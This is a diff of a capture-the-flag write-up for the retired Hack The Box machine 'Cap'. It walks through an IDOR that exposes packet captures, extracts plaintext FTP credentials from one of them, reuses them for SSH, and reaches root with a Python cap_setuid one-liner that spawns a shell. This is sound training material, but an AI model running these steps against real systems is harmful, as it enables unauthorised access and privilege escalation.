@@ -11,73 +11,117 @@ tags: [htb, easy, linux, idor, pcap, ftp, cap_setuid, python, gunicorn]
 
 > **Disclaimer:** This writeup is published after the machine was retired from Hack The Box. All flags are unique per user.
 
-# Cap — HTB Machine
+# Cap
 
-## Target Info
+**Hack The Box** · Easy · Linux
 
-| Field | Value |
-|-------|-------|
-| Platform | HTB Machines |
-| Target IP | <TARGET_IP> |
-| Attack IP | <ATTACK_IP> |
-| OS | Linux (Ubuntu 20.04.2 LTS) |
-| Difficulty | Easy |
+`IDOR` · `PCAP Analysis` · `FTP Credential Capture` · `Linux Capabilities (cap_setuid)`
 
-## Recon
+---
 
-### Nmap Scan
-- **Port 21/tcp** — FTP (vsftpd 3.0.3)
-- **Port 22/tcp** — SSH (OpenSSH 8.2p1 Ubuntu)
-- **Port 80/tcp** — HTTP (Gunicorn — "Security Dashboard")
+## Overview
 
-## Enumeration
+Cap is a Linux machine running a Python/Gunicorn web application that performs network captures. An IDOR vulnerability exposes other users' packet captures, one of which contains plaintext FTP credentials. Those credentials grant SSH access, and a misconfigured Linux capability on Python leads to root.
 
-- Web app: Python/Gunicorn "Security Dashboard" with routes:
-  - `/` — Dashboard
-  - `/capture` — 5-second PCAP capture, redirects to `/data/<id>`
-  - `/ip` — IP config
-  - `/netstat` — Network status
-- `/capture` redirects to `/data/<N>` with incrementing IDs, download at `/download/<N>`
-- FTP anonymous login denied
-- FTP is chrooted to user home directory — no path traversal
+---
 
-## Exploitation
+## Reconnaissance
 
-### IDOR → Credential Disclosure
-- `/data/0` accessible without authorization (IDOR on sequential IDs)
-- Downloaded PCAP via `/download/0`
-- PCAP contains plaintext FTP session: `nathan:<redacted>`
-- Password reuse — creds work on SSH and FTP
+```bash
+nmap -sC -sV <TARGET_IP>
+```
 
-### Privilege Escalation
-- `getcap -r /` reveals `cap_setuid` on `/usr/bin/python3.8`
-- `python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"` → root shell
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    gunicorn
+|_http-title: Security Dashboard
+```
 
-## Flags
+Three services: FTP (anonymous login denied), SSH, and a web app called "Security Dashboard" running on Gunicorn. The web app is the obvious entry point.
 
-- [x] User flag: `<flag_redacted>`
-- [x] Root flag: `<flag_redacted>`
+---
 
-## Credentials
+## Exploring the Security Dashboard
 
-| User | Password | Source |
-|------|----------|--------|
-| nathan | <redacted> | FTP login in PCAP `/download/0` |
+The dashboard is a network monitoring tool with several features:
 
-## Lessons Learned
+- `/capture` — runs a 5-second packet capture, then redirects to `/data/<id>`
+- `/ip` — shows IP configuration (like running `ifconfig`)
+- `/netstat` — shows active connections
+- `/download/<id>` — downloads the PCAP file for a given capture ID
 
-- IDOR on sequential IDs — always test `/data/0`, `/data/1`, etc. when app uses numbered resources
-- PCAP captures on a server may contain other users' plaintext credentials (FTP, Telnet, HTTP Basic)
-- Linux capabilities (`cap_setuid`) are an often-overlooked privesc vector — always run `getcap -r /`
-- Python with `cap_setuid` = instant root via `os.setuid(0)`
+Triggering a capture redirects to `/data/3`, meaning captures 0, 1, and 2 already exist from other users. The IDs are sequential and there's no authorization check — classic IDOR.
 
-## Timeline
+---
 
-| Time | Action |
-|------|--------|
-| 2026-02-16 | Started — VPN connected, machine spawned |
-| 2026-02-16 | Nmap scan — FTP, SSH, HTTP open |
-| 2026-02-16 | Web enumeration — found IDOR on /data/ endpoint |
-| 2026-02-16 | Downloaded PCAP 0 — extracted FTP creds for nathan |
-| 2026-02-16 | SSH/FTP access as nathan — user flag captured |
-| 2026-02-16 | cap_setuid on python3.8 — root flag captured |
+## Finding the IDOR
+
+Navigating to `/data/0` works without any access control. The PCAP at `/download/0` is significantly larger than the others, suggesting it captured actual traffic rather than an idle network.
+
+```bash
+wget http://<TARGET_IP>/download/0 -O capture0.pcap
+```
+
+Opening the PCAP in Wireshark (or `tshark`) reveals a plaintext FTP session:
+
+```
+220 (vsFTPd 3.0.3)
+USER nathan
+331 Please specify the password.
+PASS <redacted>
+230 Login successful.
+```
+
+FTP transmits credentials in cleartext. The user `nathan` logged in with `<redacted>`.
+
+---
+
+## From PCAP to SSH
+
+Password reuse — the FTP credentials work on SSH too:
+
+```bash
+ssh nathan@<TARGET_IP>
+# Password: <redacted>
+nathan@cap:~$ cat user.txt
+```
+
+User flag captured. Now for privilege escalation.
+
+---
+
+## Privilege Escalation via cap_setuid
+
+Linux capabilities are a finer-grained alternative to SUID bits. Instead of giving a binary full root privileges, capabilities grant specific powers. The dangerous one here is `cap_setuid` — the ability to change your user ID.
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+```
+/usr/bin/python3.8 = cap_setuid,cap_setgid+eip
+```
+
+Python3.8 has `cap_setuid`. That means any Python script can call `os.setuid(0)` to become root:
+
+```bash
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+```
+root@cap:~# cat /root/root.txt
+```
+
+Root. The entire chain: IDOR → PCAP → FTP creds → SSH → cap_setuid → root.
+
+---
+
+## Takeaways
+
+- IDOR on sequential IDs is one of the most common web vulnerabilities. Always test `0`, `1`, `-1` when an app uses numbered resources.
+- Packet captures on a server may contain other users' plaintext credentials — FTP, Telnet, HTTP Basic Auth are all visible in PCAPs.
+- Linux capabilities (`cap_setuid` in particular) are an often-overlooked privilege escalation vector. Always run `getcap -r / 2>/dev/null` during local enumeration.
+- Python with `cap_setuid` is an instant root: `os.setuid(0)` is all it takes.
+
